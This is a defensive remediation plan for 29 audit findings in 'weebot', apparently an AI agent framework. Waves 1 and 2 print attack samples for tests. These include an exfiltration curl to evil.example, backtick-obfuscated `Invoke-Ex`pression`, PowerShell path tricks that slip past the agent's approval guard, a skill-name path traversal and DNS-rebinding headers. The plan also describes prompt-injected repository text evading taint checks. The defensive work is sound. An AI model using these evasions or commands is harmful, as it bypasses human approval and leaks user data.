---
status: open
date: 2026-10-31
---

# Repo audit of 2026-10-31: plan to fix the 29 findings

## Context

A `ponytail-audit` of the whole repo found 29 problems. Twenty were reported in full. Eight smaller ones were left out of the report and are included here as F21 to F28, plus one extra (F29) that the command-safety audit noted in passing. I checked 12 of them against the code myself, marked "checked" below. The rest were reported by read-only audit agents and are marked "reported". Each task starts by confirming its finding with a failing test, so a wrong report costs one test, not a bad fix.

Assumed load: one operator on a laptop or small server, a few concurrent agent sessions, and input from web pages and mail that an attacker can influence.

Not covered by the audit, and so not covered here: the Docker, WSL2 and Modal sandboxes, `weebot/application/flows/states/` beyond grep, the Redis queue and bus, and most of `weebot/application/` outside the paths named below.

## Finding index

| ID | Finding | Source | Wave |
|----|---------|--------|------|
| F1 | Loopback counts as identity; no Origin or Host check on HTTP or WebSockets (DNS rebinding, cross-site WebSocket) | checked | 1 |
| F2 | `next.config.mjs` rewrite likely bypasses the proxy's CSRF guard | reported, rewrite checked | 1 |
| F6 | `docker-compose.yml` never passes `WEEBOT_API_KEY` or `WEEBOT_BEHIND_PROXY` to the API | checked | 1 |
| F16 | `/api/health/*` is exempt from the failed-login throttle | checked | 1 |
| F25 | SSE leaks other principals' session titles | reported | 1 |
| F26 | Behind the UI proxy, one remote client locks out the operator | reported | 1 |
| F27 | A non-ASCII key header raises `TypeError` in `hmac.compare_digest` (500, unthrottled) | checked | 1 |
| F17 | Slow regex `l2.fetch-pipe-run` on long commands | checked, timed | 2 |
| F4 | `file_editor` can write `.git/hooks/*` and `.git/config` | checked | 2 |
| F3 | The `Output/` safe-zone check is fooled by PowerShell syntax | checked | 2 |
| F29 | `Invoke-Ex`pression` evades the `Invoke-Expression` rules | reported | 2 |
| F19 | The read-only allowlist trusts a name prefix and UNC paths | reported | 2 |
| F18 | Egress checks only the first URL in a command | reported | 2 |
| F20 | Shell and Python output never taints the session | reported | 2 |
| F28 | JSON-quoted secrets are not redacted | reported | 2 |
| F5 | A verifier reply with a missing axis counts as a pass | checked | 3 |
| F7 | A cancelled scheduled job raises `UnboundLocalError` and stays `running` | checked | 3 |
| F10 | The replan path discards the failure context | checked | 3 |
| F12 | Only three role models are used, then the premium model | checked | 3 |
| F13 | Fast-fail mode matches bare substrings (`404`) | checked | 3 |
| F14 | An empty reply that carries usage is billed but never metered | reported | 3 |
| F15 | A screenshot's base64 is counted as text tokens | reported | 3 |
| F11 | Cancelling a session orphans workflow sub-agent tasks | checked | 4 |
| F22 | A retry starts before the old flow's teardown, on the same tools | reported | 4 |
| F23 | `ScheduleTool` builds a second `SchedulingManager` | reported | 4 |
| F21 | A stale `flow cancel` marker kills the next run | checked | 4 |
| F24 | The composer path saves a stale session outside the runner lock | reported | 4 |
| F8 | `restore.py` leaves stale `-wal` and `-shm` files and reports success on failure | checked | 5 |
| F9 | `skill install` writes outside the skills folder | checked | 5 |

## Design rules this plan applies

These five rules recur in every wave. Each module's design below says which one it uses.

1. **Functional core, imperative shell.** Policy is a pure function over values. A thin shell reads settings, calls the function and carries out the result. The repo already does this in `browser_launcher.plan_launch`. It fits the guards in `weebot/core`, where a table of cases can test the policy with no mocks.
2. **Parse, do not validate, at a boundary.** Turn raw text into a typed value once (a `ShellWord`, a `Scores` model, a `SkillName`). Code past the boundary cannot hold a bad value. This matches the project rule that agents return Pydantic-validated structures.
3. **Default deny.** A construct the parser does not understand is "unknown", and unknown means ask or refuse. It never means allow. `docs/SECURITY_MODEL.md` already requires fail-closed defaults.
4. **One rule, one home.** When two transports or two call sites share a rule, they call one function. F25 (WebSocket and SSE), F27 (five compare sites), F4 (`write_target` and `PathValidator`) and F15 (two token estimators) are all copies of a rule that drifted.
5. **Structured concurrency.** A task scope never outlives its children. Cancel and await them when the scope exits, whatever the reason. Used for F11 and F22.

Layer rules stay as they are (`tests/unit/test_architecture_fitness.py`, `.importlinter`). Pure policy goes in `weebot/core` (cross-cutting guards). Interfaces and application code import it. `weebot/core` imports nothing from application or interfaces. Ceilings in `tasks/quality/ceilings.toml` only go down. A new cross-layer dependency goes through a port and DI, not `ignore_imports`.

## Order of work and why

Order is risk times blast radius, then effort, then dependencies.

- **Wave 1: network trust boundary and deploy (F1, F2, F6, F16, F25, F26, F27).** These are reachable from any web page the operator visits. F6 is one line but breaks every Docker deploy, so it ships first.
- **Wave 2: shell, file and egress guards (F17, F4, F3, F29, F19, F18, F20, F28).** These need prompt injection to reach, one step further from an attacker than wave 1. Inside the wave: F17 and F4 are small and independent, so they go first. F3, F29 and F19 share one tokenizer, so they ship together. F18 comes before F20, because F20 reuses the all-hosts extractor.
- **Wave 3: silent wrong answers and wrong bills (F5, F7, F10, F12, F13, F14, F15).** Nothing here is exploitable, but each fails without a sign. F15 comes before F14 because both change what the cascade counts.
- **Wave 4: lifecycle and concurrency (F11, F22, F23, F21, F24).** Rare interleavings. They touch `task_runner`, the orchestrator and the scheduler tool.
- **Wave 5: deploy and ops tools (F8, F9).** Operator-run commands, low frequency.

Waves 1 and 2 touch disjoint files and can run in parallel sessions. Wave 3 touches the cascade and flow states. Waves 4 and 5 are independent of 1 to 3.

One branch and one PR per wave (`fix/audit-1031-w1` to `fix/audit-1031-w5`). Merge in wave order. Each task writes its failing test first and sees it fail. Nothing is pushed or merged without the owner asking.

---

## Wave 1: network trust boundary and deploy

### F6. Compose passes no API key (do first)

- **Files:** `docker-compose.yml` (`weebot-api`, lines 49 to 86), `.github/workflows/architecture.yml` (smoke test near line 393).
- **Root cause:** the API container has no `WEEBOT_API_KEY`, no `env_file` and no `WEEBOT_BEHIND_PROXY`. Auth is on by default and the UI calls from a bridge IP, so every `/api/*` call returns 503.
- **Fix:** add `WEEBOT_API_KEY=${WEEBOT_API_KEY:-}` and `WEEBOT_BEHIND_PROXY=1` to `weebot-api`. This is configuration, so no pattern applies.
- **Test first:** extend the CI smoke test to call one authenticated route (`/api/sessions` with the key) and expect 200. The current test only calls `/api/health`, which is why this stayed green.
- **Outcome (2026-10-31):** done. `WEEBOT_API_KEY` and `WEEBOT_BEHIND_PROXY=1` are in `docker-compose.yml`, and the CI smoke job now calls `/api/sessions` with and without the key. The compose stack itself was not run here, so the new CI step is its first real check.

### F27. Constant-time compare that survives non-ASCII (do before the rest of the wave)

- **Files:** new `weebot/core/secret_compare.py`; call sites `weebot/interfaces/web/auth.py` (181, 189, 225), `routers/webhook.py` (45, 55), `weebot/mcp/server.py` (92).
- **Root cause:** `hmac.compare_digest(str, str)` raises `TypeError` for non-ASCII text, and Starlette decodes header bytes as latin-1.
- **Design (one rule, one home):** `safe_equals(a, b) -> bool` encodes both sides as UTF-8 and calls `hmac.compare_digest` on the bytes. A `None` on either side returns `False`. All five sites call it.
- **Tests first:** `safe_equals("é", "é")` is true, `safe_equals("é", "e")` is false, and `None` is false. A fitness test in `tests/unit/test_architecture_fitness.py` fails if `compare_digest(` appears anywhere outside `secret_compare.py`, so a sixth site cannot reappear. A web test sends `X-API-Key` with byte `0xE9` and expects 401, not 500.
- **Outcome (2026-10-31):** done, and wider than planned. The fitness test found 11 call sites, not 5: `gateways/slack.py`, `gateways/whatsapp.py`, `stripe_webhook_handler.py` and `api_key_crypto.py` also compared an attacker-supplied value with a raw `compare_digest`. The Slack and WhatsApp signature headers had the same 500.

### F1. Host and Origin guard

- **Files:** new `weebot/core/net_trust.py`; `weebot/interfaces/web/main.py` (middleware list around 470 to 537, WebSocket handlers 623 to 676); `routers/behavior_router.py` (305 to 323); `weebot/config/settings.py`; `scripts/generate_config_reference.py`; `weebot-ui/src/app/api/[[...path]]/proxy-guard.ts`.
- **Root cause:** with no key, any loopback peer is "anonymous". Nothing reads `Origin` or `Host`. CORS does not apply to WebSockets, and DNS rebinding makes a hostile site look same-origin.
- **Design (functional core, imperative shell):**
  - Core: pure functions `is_loopback_host`, `host_allowed(host_header, allowed)` and `origin_allowed(origin, allowed)`. No I/O. `host_allowed` strips the port and handles `[::1]`.
  - Shell: one pure-ASGI middleware, `HostGuardMiddleware`, covers both HTTP and WebSocket handshakes, so a new route cannot forget it. It answers 421 for a foreign `Host` from a loopback peer (a remote peer has no loopback trust to abuse). It closes a WebSocket with code 4403 (4003 is already the routes' own auth close) when `Origin` is present and not allowed. A missing `Origin` is allowed, because non-browser clients send none.
  - The loopback set already lived in `auth.py`; it moves to `net_trust.LOOPBACK_PEERS` and `auth.py` imports it, so there is one loopback rule.
  - Setting: `WEEBOT_ALLOWED_HOSTS` (default `localhost,127.0.0.1,[::1]`; the setting adds names). Origins reuse the existing CORS list.
  - The UI proxy gets the same `Host` rule as a small pure TypeScript function in `proxy-guard.ts`.
- **Tests first:**
  - Table tests for the three core functions: IPv6, ports, uppercase, empty, `localhost.evil.test`, `127.0.0.1.evil.test`.
  - A web test: `Host: evil.test` gets 421 on `/api/sessions`.
  - A fitness test that lists every `WebSocketRoute` in the app and asserts each one rejects `Origin: http://evil.test`. A new WebSocket route cannot forget the guard.
  - A Hypothesis test: `host_allowed` never accepts a host whose label list does not equal an allowed entry.
- **Check by hand:** with the dev server running, open the UI and confirm the normal page still loads over `localhost` and `127.0.0.1`.
- **Outcome (2026-10-31):** done. The Host rule applies to loopback peers only; the Origin rule applies to every WebSocket handshake. The guard closes with 4403 because 4003 is already the routes' own auth close. The Next.js proxy enforces the Host rule only when its backend is local, so a UI in a container that users reach by a LAN name is not locked out. Checked live: `Host: evil.test` gets 421, a WebSocket with `Origin: http://evil.test` is refused at the handshake, and the UI-to-backend path still works. Existing tests that simulate a loopback peer now set `Host: localhost`.

### F2. Remove the rewrite that shadows the proxy route

- **Files:** `weebot-ui/next.config.mjs` (23 to 28), `weebot-ui/src/app/api/[[...path]]/route.ts`.
- **Root cause:** `rewrites()` sends `/api/*` straight to `http://localhost:8000`. Next.js normally applies it before dynamic routes, so `isForeignMutation` may never run, and `BACKEND_URL` is ignored. The routing order is not yet confirmed.
- **Fix:** delete the `rewrites()` block. The route handler already covers `/api/*`.
- **Test first, to confirm the finding:** start `next start`, POST `/api/sessions/x/cancel` with `Origin: http://evil.test`, and record whether the response is 403. If it is already 403, the finding is wrong and the change is only cleanup, which the plan records. If not, the test is the regression test. Add a static test that fails if `next.config.mjs` declares a rewrite for `/api`.
- **Outcome (2026-10-31):** the finding was real. On the dev server a cross-site POST to `/api/sessions/x/cancel` was proxied by Next's rewrite to `localhost:8000` (the log said `Failed to proxy ...`) and never reached the handler. After deleting `rewrites()` the same request gets 403, and a rebound Host gets 421.

### F16. Throttle tiers by exact path

- **Files:** `weebot/interfaces/web/rate_limit.py` (42, 66 to 77, 191 to 195).
- **Root cause:** `_path_tier` prefix-matches `/api/health` to the unlimited tier, so `/api/health/status` skips the failed-login count.
- **Design:** the unlimited tier is a set of exact paths. `_path_tier` skips prefix entries whose tier is unlimited.
- **Tests first:** table-driven. `/api/health` is unlimited. `/api/health/status` and `/api/health/x` are not. Thirty wrong keys sent to `/api/health/status` produce a 429, which restores the plan W2.7 behavior.
- **Outcome (2026-10-31):** done. The unlimited set also held `/api/live` and `/api/ready`, which do not exist; it is now the three real public probe paths. `/api/healthz` was unlimited too, through the same prefix match.

### F26. Per-client failure bucket behind the proxy

- **Files:** `rate_limit.py` (197 to 207, 254 to 255); `auth.py` (55 to 64 states the proxy rule).
- **Root cause:** the failure bucket is keyed by `request.client.host`. Behind the proxy that is always `127.0.0.1`, so one remote caller fills the bucket for everyone.
- **Design (pure key function):** `bucket_key(peer, forwarded_for, behind_proxy)` returns the first `X-Forwarded-For` hop only when `behind_proxy` is true and the peer is loopback. Otherwise it returns the peer. `X-Forwarded-For` is trusted only from a loopback peer, so a remote client cannot forge it.
- **Tests first:** table tests for the key function. A middleware test: ten bad requests from one forwarded client do not block a second forwarded client or the right key.
- **Outcome (2026-10-31): not fixed, by decision.** Next.js sets `x-forwarded-for` only when it is absent (`req.headers['x-forwarded-for'] ??= socket.remoteAddress`, `next/dist/server/base-server.js`), so a client can forge it. Keying the failure budget on it would let an attacker rotate the header to escape the guess throttle, which is worse than the lockout. Recorded as a known limit in `docs/SECURITY_MODEL.md`; the real fix is a per-client rate limit in a reverse proxy in front of the UI.

### F25. One visibility rule for WebSocket and SSE

- **Files:** new `weebot/interfaces/web/event_visibility.py`; `routers/sse.py` (63 to 74); `event_broadcaster.py` (51 to 57); `websocket.py` (154 to 163).
- **Root cause:** `SessionPresenceEvent` carries an empty `session_id` plus `owner_user_id` and `title`. The WebSocket path filters it by owner. SSE's `_visible` passes any event with an empty `session_id`. A session that does not exist yet passes `verify_session_ownership(None)` and the allow is cached for the connection.
- **Design (one rule, one home):** a pure predicate `visible_to(event, principal, ownership_enforced) -> bool`. Both transports call it. Do not cache an allow when the session was `None`.
- **Tests first:** parametrize over the transport (SSE, WebSocket) and the event type, with two principals. Principal B must not see principal A's presence event on either transport.

---

## Wave 2: shell, file and egress guards

All of this sits in `weebot/core` and `weebot/application/services`. The pattern throughout is a pure policy function plus default deny. Existing guard tests stay as they are. New tests are added beside them.
- **Outcome (2026-10-31):** done. `EventVisibility` (one per SSE connection) and `presence_owner` live in `weebot/interfaces/web/event_visibility.py`; the broadcaster uses the same `presence_owner`.

### F17. Bound the analysis and the regex

- **Files:** `weebot/tools/bash_security.py` (184 to 190, run at 326 and 348); `tool_guards.py` (136); `bash_tool.py` (269).
- **Root cause:** `l2.fetch-pipe-run` has three `.*` groups and `get` has no trailing boundary. I timed it: 400 words take 0.03 s and growth is about n^2.6, so roughly 20 s at 5,000 words and minutes at 20,000. The regex runs synchronously, so the event loop stalls.
- **Fix:** one cap at the single entry point, `analyze(command)`: a command over 8 KB returns DANGEROUS with the reason "too long to analyse". It is not skipped, which would be fail-open. The pattern uses `[^|\n]*` and `\bget\b`.
- **Tests first:** a 20,000-word command returns in under 0.5 s with a DANGEROUS verdict. A Hypothesis test: for any generated command, `analyze` returns within a time bound. The existing fetch-pipe-run cases still match.

### F4. One protected-path rule

- **Files:** `weebot/core/output_path.py` (55 to 85); `weebot/infrastructure/security/security_validators.py` (214 to 238).
- **Root cause:** `write_target` blocks any path with a `.git` component or a protected basename. `PathValidator.validate` does not, and its extension check runs only `if input_path.suffix:`, so `.git/hooks/pre-commit` has no suffix and skips it.
- **Design (one rule, one home):** extract `is_protected_path(path)` in `output_path.py` and make `PathValidator.validate` call it. Compare case-insensitively, because Windows is case-insensitive. Reject a suffixless write unless the name is on an allowlist.
- **Tests first:** `.git/hooks/pre-commit`, `.GIT\config`, `a/.git/hooks/x` and `.env` are rejected through `file_editor` for create, insert and replace. `README` is still allowed. Add these cases to the r13 suite.

### F3, F29, F19. One shell tokenizer, default deny

These three share a root cause: the approval policy reasons about command text with regexes and string splits, while PowerShell parses it differently. They are one change.

- **Files:** `weebot/core/shell_segments.py` (56 to 79); `weebot/core/approval_policy.py` (`_in_output` 630 to 658, `_output_scoped` 667 to 720, `is_read_only_segment` 550 to 594, 493); `weebot/core/bash_guard.py`; `weebot/tools/bash_security.py`.
- **Root cause (checked for the first two, reported for the rest):**
  - `_in_output` splits on `/` only, so `Output/a.txt,/Users/me/doc.docx` reads as one path inside `Output/`. PowerShell reads a two-item list. A backtick (``Output/.`./x``) becomes `..`.
  - `cd` counts as read-only, but the next segment is judged against this workspace's `Output/` while it runs in the new directory.
  - `$p += "..."` is not matched by the assignment regex, so `$p` counts as assigned once.
  - `get-info.cmd` is "read-only" because its basename starts with `get-`. `Get-ChildItem \\host\share` is read-only and opens an SMB connection.
  - `Invoke-Ex`pression` evades every `Invoke-Expression` rule.
- **Design (parse, do not validate, plus default deny):**
  - `shell_segments.tokenize(segment) -> list[ShellWord]`. A `ShellWord` is a frozen dataclass: the text, plus flags `has_escape` (a backtick), `has_variable`, `has_wildcard`, `is_list` (a comma), `is_unc`, `is_dynamic_name` (string concatenation in a command name).
  - `_in_output(word)` takes a `ShellWord`. Any flag set returns False, so the policy falls through to "ask".
  - Read-only is an exact lowercase cmdlet and program set: no `get-` prefix, no basename stripping, `.exe` allowed only from System32. A word with `is_unc` or a path ending in a script type is never read-only.
  - After a `cd`, `Set-Location` or `Push-Location` segment, later segments in the chain are not Output-scoped. This is the conservative rule. Real working-directory tracking is not worth the complexity here.
  - Variables: any `$name` used in a destructive argument is "unknown". That also covers `+=`, `-=` and every other assignment form, instead of enumerating operators.
  - F29: `bash_security` normalizes a command (strips backticks that are not line continuations) before its rules run. A command name built by concatenation is SUSPICIOUS, which asks.
- **Tests first:**
  - A golden table of every attack string in the audit. Each must come out "ask" or "deny", never AUTO_APPROVE.
  - A Hypothesis property: for any word containing one of `, ` ; * ? $ ~` or `\\`, `_in_output` is False.
  - The existing `tests/unit/fixes/test_r01_*` and approval-policy suites still pass: legitimate `Output\x` writes are still auto-approved.
- **Expect more prompts:** this tightens the policy, so some multi-path commands that used to run silently now ask. That is the safe direction. See decision D6.

### F18. All hosts, not the first

- **Files:** `weebot/core/egress_guard.py` (483, 522, 598 to 601); `weebot/application/services/_tool_executor.py` (505).
- **Root cause:** `_extract_host_from_cmd` returns only the first URL. After `pypi.org` is allowed, `curl -d @file https://pypi.org/ https://evil.example/c` has a known recipient.
- **Design:** `extract_hosts(command) -> frozenset[str]` returns every URL host, every UNC host (`\\host`) and every bare host after a network verb. The policy is a subset test: every host must be known. An empty set with a network verb is unknown. `network_use()` uses the same function.
- **Tests first:** two URLs where the second is unknown asks. UNC and bare-host forms ask. A single known URL is unchanged. Hypothesis: adding any host to a command can only move the verdict toward ask.

### F20. Taint after a networked shell call

- **Files:** `weebot/application/services/_tool_executor.py` (505 to 529); `weebot/core/trust_boundary.py` (79 to 90). Tools stay unchanged.
- **Root cause:** `bash_tool`, `powershell_tool` and `python_tool` declare `OutputTrust.LOCAL`, and `must_taint` fires only for EXTERNAL. After `git clone` of an allowed host, injected text in the repo is read with no taint, so the "ask after untrusted content" rule (D5) never fires.
- **Design:** classification belongs in the application layer, where the call and its result are both visible. After a LOCAL shell or Python call, `ToolExecutor` marks the session tainted when `egress_guard.network_use(command)` is true (F18's function). The tools do not change and do not learn about taint.
- **Tests first:** `git clone https://github.com/x/y` followed by a file read, then a write outside `Output/`, asks. A local `dir` does not taint. The existing S1 taint-replay test still passes.
- **Behavior change:** more approval prompts in sessions that touch the network from a shell. See decision D1.

### F28. One redaction home

- **Files:** `weebot/core/secret_redaction.py` (54); `credential_sanitizer.py` (24, 28).
- **Root cause:** both need `password"` then `:` with nothing between, so `{"password": "x"}` and `"token": "abc"` pass through. Two modules carry two copies of the key list.
- **Design (one rule, one home):** one pattern builder with optional quotes and whitespace around the key and the separator. `credential_sanitizer` calls `secret_redaction`, and the second key list goes away. That removes code, which is the lean direction.
- **Tests first:** a table of key styles (`password=x`, `"password": "x"`, `'token':'x'`, `Authorization: Bearer x`). A Hypothesis test: for any key from the list and any value, the value does not survive redaction. `tests/unit/fixes/test_r23_no_key_in_logs.py` still passes.

---

## Wave 3: silent wrong answers and wrong bills

### F5. A verifier reply must have all four scores

- **Files:** `weebot/application/flows/states/verifying.py` (300 to 340); `weebot/models/structured_output.py`; `weebot/config/constants.py` (123).
- **Root cause (checked):** `scores.get(axis, VERIFICATION_SCORE_MIN)` fills a missing axis with 3, and the fail test is `< 3`, so a missing axis passes.
- **Design (parse, do not validate):** a Pydantic `VerifierScores` model with four required integer fields, each 1 to 5. Parse the reply into it. A `ValidationError` returns `(None, False)`, which maps to `NOT_RUN`. This follows the project's Structured Output Protocol.
- **Tests first:** `""`, `{}`, `{"correctness": 5}`, a string score, a score of 9 and a fenced JSON reply each give the right result. Only a full valid reply is PASSED. This is the same defect class as D14 in `step_evaluator.py`.

### F7. A scheduled job records its end even when cancelled

- **Files:** `weebot/scheduling/scheduler.py` (440 to 474).
- **Root cause (checked):** `outcome` is set only on success or in `except Exception`. A cancel raises `CancelledError`, which is a `BaseException`, so `finally` hits an unbound local.
- **Design:** set `outcome = (False, "cancelled")` before the `try`, add `except asyncio.CancelledError` that sets it and re-raises, and run `_record_run_end` through `asyncio.shield` so the cancel does not also cancel the database write.
- **Tests first:** start a job that awaits, cancel it, and assert the row is not `running`, `error_count` rose, and the cancel still propagated.

### F15, then F14, F13, F12: the cascade

Files: `weebot/application/agents/executor/_cascade.py`, `_context_compressor.py`, `weebot/core/error_classifier.py`, `weebot/config/model_refs.py`.

- **F15, one token estimator (one rule, one home).**
  - Root cause (reported): both estimators use `len(str(content)) // 4`, so a base64 image in a list-valued message counts as text.
  - Design: one `estimate_tokens(messages)` in `weebot/core` (grep for an existing helper first and reuse it). It counts the `text` parts of list content, plus a flat figure per image part. `_context_compressor` and `_cascade._call_unanswered` both call it.
  - Test first: a message with a 400 KB image part counts as about 1.5k tokens and does not trigger compaction.
- **F14, meter at one point.**
  - Root cause (reported): `_call_completed` runs only when the reply has content or tool calls. An empty reply with usage is billed and never counted, and the model's breaker does not advance.
  - Design: record usage immediately after `await chat(...)` returns, before the content is interpreted. Every path then meters, including empty and failed replies. Record the failure in the breaker in the empty branch.
  - Test first: a fake adapter returns `content=""` with real usage. The session meter increases and the model's breaker records one failure.
- **F13, one error classification.**
  - Root cause (checked): `_is_fast_fail_error` tests `"404"`, `"401"` and `"403"` as raw substrings. `ErrorClassifier` was already fixed with word-bounded codes.
  - Design: call `ErrorClassifier.classify(exc)` and fast-fail only on `AUTH` or `MODEL_UNAVAILABLE`.
  - Test first: a 429 whose body holds a request id containing `404` does not clamp later timeouts to 15 s.
- **F12, a data-driven cascade plan (functional core).**
  - Root cause (checked): Phase 1 uses `role_cascade[0..2]` and Phase 2 adds `role_fallback2` and the premium model. Entries from index 3 are never tried, and a prepended Ollama or free entry shifts paid models out of the slots.
  - Design: a pure `build_cascade_plan(role_cascade, tier4, tripped, within_budget) -> CascadePlan` returns the ordered phases from the whole de-duplicated list. The shell runs the plan. Phase sizes become named constants, not index arithmetic.
  - Tests first: a table with 4 and 5 entries, with Ollama and free models prepended, with tripped and over-budget models. The cheap fourth entry is tried before the premium one.

### F10. The replan command carries typed context

- **Files:** `weebot/application/cqrs/commands.py` (55), `weebot/application/cqrs/handlers/update_plan_handler.py` (55 to 80), `weebot/application/flows/states/updating.py` (85, 118 to 124).
- **Root cause (checked):** `UpdatingState` puts `failure_context` and `reason` in an untyped `updates` dict. The handler never reads either, picks its own last step, and calls `planner.update_plan(plan, last_step)` with no context. The tree-of-thoughts calls are paid and discarded.
- **Design:** `UpdatePlanCommand` gets typed fields, `failure_context: str = ""` and `last_step_id: str | None = None`, replacing the dict keys. The handler finds the step by id and passes the context to the planner. A typed field fails at construction time where a dict key silently does not.
- **Tests first:** a fake planner records its arguments. The handler passes the failure text and the chosen step. A failed step no longer re-adds an equivalent step.
- **Open question:** whether the tree-of-thoughts step is worth 4 calls per failure once its output is used. Decision D5.

---

## Wave 4: lifecycle and concurrency

### F11, F22. A task scope that cancels its children (structured concurrency)

- **Files:** new `weebot/core/task_scope.py`; `weebot/core/workflow_orchestrator.py` (238 to 284); `weebot/application/services/task_runner.py` (385 to 433); `weebot/application/models/tool_collection.py` (130 to 154); `adaptive_capability_router.py` (the `create_task` block).
- **F11 root cause (checked):** the `finally` cancels `running_tasks` only if an explicit orchestrator-cancel flag is set. A plain task cancel leaves up to 10 child flows running LLM loops.
- **Design:** a small async context manager, `TaskScope`, that owns a set of tasks. On exit, for any reason, it cancels the rest and awaits them with `return_exceptions=True`. The orchestrator uses it instead of a bare dict. `asyncio.TaskGroup` does not fit, because the orchestrator needs "wait for the first to finish" while it schedules a dependency graph.
- **F22 root cause (reported):** the retry branch calls `_start_direct` before the `finally` runs the old flow's `teardown()`, and both flows share one `ToolCollection`. The teardown can close the browser the new flow is about to use.
- **F22 fix:** await `flow.teardown()` before `_start_direct` in the retry branch.
- **Tests first:** cancel an orchestrator mid-wait and assert every child task is done and cancelled. A fake flow records the order of `teardown` and the retry start. A fake adapter shows the retry gets a live browser.

### F23. The schedule tool uses the container's scheduler through a port

- **Files:** new `weebot/application/ports/scheduler_port.py`; `weebot/tools/schedule_tool.py` (13 to 21, 124, 227 to 232); `weebot/application/di/__init__.py` (233); `weebot/application/services/tool_registry.py`; `weebot/scheduling/scheduler.py` (146 to 154).
- **Root cause (reported):** `get_scheduler()` builds a second `SchedulingManager` with its own APScheduler and empty `_callables`. Edits through the tool never reach the running scheduler. `start_scheduler` makes every default job fire twice and records `FAILED` over the real run's status.
- **Design (dependency inversion):** a `SchedulerPort` protocol with the job operations the tool needs (create, update, delete, list, pause, resume). `SchedulingManager` satisfies it, and DI registers it. The tool receives the port through the registry's wiring, the same way `browser_factory` reaches `web_scraper`. If `schedule_tool` has an `ignore_imports` entry for the manager, it goes away, which lowers the exemption ceiling.
- **Fix to the tool's surface:** remove the `start_scheduler` and `stop_scheduler` actions. Decision D3.
- **Tests first:** a tool call changes the DI scheduler's job, and only one manager exists. An import test shows the tool no longer imports `weebot.scheduling`.

### F21. A cancel request is tied to a run

- **Files:** `weebot/core/cancel_requests.py`; `cli/commands/flow.py` (300 to 312); `weebot/application/flows/plan_act_flow.py` (379).
- **Root cause (checked):** the marker file has no time and no owner. Only a loop iteration of a live flow consumes it. A marker written while no flow was alive cancels the next legitimate run on its first iteration.
- **Design:** the marker stores `requested_at`. `take(session_id, since)` ignores a marker older than `since`. A flow calls it with its own start time, and `begin_run` clears a stale marker.
- **Tests first:** a marker written before a run starts does not cancel that run. A marker written during the run does.

### F24. The composer saves inside the session lock

- **Files:** `weebot/application/use_cases/dispatch_session_input.py` (96 to 100, 151 to 165); `task_runner.py` (244 to 256, 453); `weebot/interfaces/web/routers/sessions.py` (436).
- **Root cause (reported):** `save_session(ctx.session)` runs before `start_session`, outside `TaskRunner._lock_for`. Two near-simultaneous inputs can overwrite each other with a stale snapshot, so the row goes back to COMPLETED with the wrong prompt.
- **Design:** do the save inside the per-session lock in `start_session`. If the repository has `save_session_if_unchanged`, use it with `updated_at` as an optimistic check, and surface a conflict as the existing 409.
- **Tests first:** two concurrent `/input` calls on a COMPLETED session. One gets 409, and the stored `last_prompt` is the winner's.

---

## Wave 5: deploy and ops tools

### F8. Restore by write, verify, then swap

- **Files:** `scripts/restore.py` (96 to 118, 160 to 170).
- **Root cause (checked):** only the main database file is renamed. A leftover `-wal` replays onto the restored copy. A failed integrity check prints FAILED, and `main()` still prints "Restore completed successfully" and exits 0.
- **Design:** build the restored file as a temp file in the same folder, using the `sqlite3` backup API from the backup into it. Run `PRAGMA integrity_check` on the temp file. Only if it passes, move the old file and its `-wal` and `-shm` to `.pre-restore-bak*`, and `os.replace` the temp file into place. A failure leaves the old database untouched and returns a non-zero exit code.
- **Tests first:** use a temporary folder with a WAL-mode database that has an uncheckpointed `-wal`. After restore, the data equals the backup, no stale sidecar remains, and a corrupt backup exits non-zero with the old database intact.

### F9. A `SkillName` value object at the CLI boundary

- **Files:** new `weebot/domain/models/skill_name.py`; `cli/commands/skills.py` (205 to 226); `weebot/application/skills/format_detector.py` (51, 65).
- **Root cause (checked):** `skill_name` comes from the skill's own `manifest.json` and goes into a path unchecked, so a name like `../../../.claude/skills/x` writes outside `.weebot/skills`.
- **Design (parse, do not validate):** `SkillName.parse(text)` accepts `^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$` and rejects `..`. It lives in the domain, which stays pure. The CLI parses at the boundary. As defense in depth, `target.resolve().parent` must equal the skills folder.
- **Tests first:** `../x`, `a/b`, `a\b`, an absolute path, an empty name and a 200-character name are rejected. A normal name installs.

---

## Cross-cutting work

- **Fitness tests added.** No `compare_digest(` outside `secret_compare.py` (F27). Every WebSocket route rejects a foreign `Origin` (F1). No `get-` prefix allowlist remains in `approval_policy.py` (F19). All new tests are table-driven or property tests. Hypothesis is installed (6.170.14).
- **Ratchets.** Run `python scripts/prepush_gates.py` per wave. Ceilings only go down. F23 and F28 should lower an exemption or a duplicate-code figure, and each PR records any ceiling it lowers.
- **Import contracts.** `weebot/core/net_trust.py`, `secret_compare.py`, `task_scope.py` and the token estimator import only the standard library. `SchedulerPort` and `SkillName` sit in `application/ports` and `domain`. Run `make lint-imports` after each wave.
- **Config reference.** F1 adds `WEEBOT_ALLOWED_HOSTS`. Run `PYTHONPATH=. python scripts/generate_config_reference.py` and commit `.env.example` and `docs/CONFIGURATION.md`.
- **Map cards.** Update the web, approval policy, egress, cascade, scheduler and browser tool cards with full-path citations. Run `python scripts/check_map_citations.py --drift` after committing, and `--fix` only for cards whose citations were correct at their stamped commit.
- **Docs.** Update `docs/SECURITY_MODEL.md` where a bullet changes: the loopback rule (F1), the egress rule (F18) and taint (F20). Mark each bullet with the test that proves it.
- **Verification beyond unit tests.** For F1 and F2, run the dev server and the UI in the browser and check a normal session still works from `localhost` and `127.0.0.1`. For F8, do one restore against a throwaway copy of a real database.

## Decisions for the owner

- **D1 (F20).** More approval prompts after a shell or Python call that touches the network. Recommended: accept. It closes the gap in the "ask after untrusted content" rule.
- **D2 (F1).** Reverse-proxy setups must set `WEEBOT_ALLOWED_HOSTS`, or their requests get 421. Recommended: default to local names only and document it.
- **D3 (F23).** Remove the agent's `start_scheduler` and `stop_scheduler` actions. They duplicate the container's scheduler and cause double firing. Recommended: remove.
- **D4 (F12).** Trying every role entry before the premium model should lower cost, but it adds latency on failure paths. Recommended: go ahead and watch the cost meter in the first week.
- **D5 (F10).** Keep or drop the tree-of-thoughts step once its result is used. Recommended: keep it behind its existing flag and measure the success rate before deciding.
- **D6 (F3, F19).** The tighter shell parser asks for approval on some multi-path commands that used to run silently. Recommended: accept, since asking is the safe direction.

## Risks and rollback

- A stricter guard can only turn a silent allow into an ask. It cannot turn an ask into a silent allow, so false positives cost prompts, not safety. `WEEBOT_SHELL_GUARD_MODE=observe` still logs what the guard would do.
- Each wave is one PR, so a wave reverts cleanly on its own.
